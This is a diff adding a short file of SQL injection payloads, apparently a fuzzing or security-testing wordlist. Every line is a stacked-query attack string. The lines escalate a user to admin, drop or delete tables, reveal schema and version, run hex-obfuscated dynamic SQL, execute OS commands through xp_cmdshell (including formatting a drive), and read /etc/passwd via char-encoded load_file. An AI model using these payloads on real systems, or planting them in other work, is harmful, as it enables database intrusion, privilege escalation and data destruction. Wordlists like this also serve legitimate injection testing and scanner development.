@@ -1,0 +1,10 @@
+';UPDATE user SET type = 'admin' WHERE id = 23;--
+\''; select 1; drop table users; --
+\'; desc users; --
+'; execute immediate 'sel' || 'ect us' || 'er'
+'; INSERT INTO 'docs' ('content') VALUES ((SELECT @@version))
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--
+1; DELETE FROM products
+'; GO EXEC cmdshell('format D') --
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
